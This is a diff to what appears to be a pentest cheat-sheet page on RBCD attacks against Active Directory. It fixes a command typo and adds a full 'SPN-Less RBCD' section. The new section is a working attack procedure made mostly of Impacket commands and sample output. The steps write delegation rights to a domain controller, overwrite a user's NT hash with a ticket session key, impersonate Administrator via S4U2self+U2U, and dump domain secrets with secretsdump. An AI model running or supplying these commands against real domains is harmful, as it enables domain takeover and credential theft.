@@ -1,7 +1,6 @@
 ---
 title: "RBCD Attack"
-date: 2025-7-25
-tags: ["Pass-The-Ticket", "Pass-The-Hash", "Silver Ticket", "Ticket Granting Ticket", "Active Directory", "Windows", "RBCD", "Resource-Based Constrained Delegation", "S4U", "Impersonate", "Credential Dumping", "Genericall", "WriteAccountRestrictions"]
+tags: ["Pass-The-Ticket", "Pass-The-Hash", "Silver Ticket", "Ticket Granting Ticket", "Active Directory", "Windows", "RBCD", "Resource-Based Constrained Delegation", "S4U", "Impersonate", "Credential Dumping", "Genericall", "WriteAccountRestrictions", "SPN-less"]
 ---
 
 ### RBCD Attack
@@ -105,7 +104,7 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 
 ```console
 # NTLM
-sudo ntpdate -s <DC_IP> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> '<DOMAIN>/<COMPUTER' -hashes ':<HASH>'
+sudo ntpdate -s <DC_IP> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> '<DOMAIN>/<COMPUTER>' -hashes ':<HASH>'
 ```
 
 #### 5. Import Ticket
@@ -442,3 +441,124 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca
 ```
 
 {{< /tabcontent >}}
+
+---
+
+### SPN-Less RBCD Attack
+
+{{< tab set2 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+
+#### 1. RBCD
+
+```console
+impacket-rbcd -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
+```
+
+```console {class="sample-code"}
+$ impacket-rbcd -delegate-from 'aseed' -delegate-to 'DC$' -dc-ip 10.10.86.220 -action 'write' 'example.com/aseed:gB6XTcqVP5MlP7Rc'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] aseed can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     aseed        (S-1-5-21-4029599044-1972224926-2225194048-1126)
+```
+
+#### 2. Generate NTLM
+
+```console
+iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
+```
+
+```console {class="sample-code"}
+$ iconv -f ASCII -t UTF-16LE <(printf 'gB6XTcqVP5MlP7Rc') | openssl dgst -md4
+MD4(stdin)= 8ecffccc2f22c1607b8e104296ffbf68
+```
+
+#### 3. Request a TGT
+
+```console
+impacket-getTGT '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -hashes ':<HASH>'
+```
+
+```console {class="sample-code"}
+$ impacket-getTGT 'example.com/aseed@DC.example.com' -hashes ':8ecffccc2f22c1607b8e104296ffbf68'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in aseed@DC.example.com.ccache
+```
+
+#### 4. Get Session Key
+
+```console
+# Import ticket
+export KRB5CCNAME='<CCACHE_FILE>'
+```
+
+```console {class="sample-code"}
+$ export KRB5CCNAME='aseed@DC.example.com.ccache'
+```
+
+```console
+# Get tickey session key
+impacket-describeTicket '<CCACHE_FILE>' | grep 'Ticket Session Key' 
+```
+
+```console {class="sample-code"}
+$ impacket-describeTicket aseed@DC.example.com.ccache | grep 'Ticket Session Key' 
+[*] Ticket Session Key            : 49e0cd8abe883d869f5af9ad8556fb29
+```
+
+#### 5. Update Target User NT Hash
+
+```console
+impacket-changepasswd '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' -newhashes :<SESSION_KEY>
+```
+
+```console {class="sample-code"}
+$ impacket-changepasswd -newhashes :49e0cd8abe883d869f5af9ad8556fb29 'example.com/aseed:gB6XTcqVP5MlP7Rc@DC.example.com'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of example.com\aseed
+[*] Connecting to DCE/RPC as example.com\aseed
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
+```
+
+#### 6. Get a Service Ticket
+
+```console
+impacket-getST '<DOMAIN>/<USER>' -k -no-pass -u2u -impersonate 'Administrator' -spn 'cifs/<TARGET_DOMAIN>'
+```
+
+```console {class="sample-code"}
+$ impacket-getST 'example.com/aseed' -k -no-pass -u2u -impersonate 'Administrator' -spn 'cifs/DC.example.com'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC.example.com@PHANTOM.VL.ccache
+```
+
+#### 7. Secrets Dump
+
+```console
+# Import ticket
+export KRB5CCNAME='<CCACHE_FILE_2>'
+```
+
+```console {class="sample-code"}
+$ export KRB5CCNAME='Administrator@cifs_DC.example.com@PHANTOM.VL.ccache'
+```
+
+```console
+# Secrets dump
+impacket-secretsdump -k -no-pass <TARGET_DOMAIN>
+```
+
+{{< /tabcontent >}}
+
+<br>
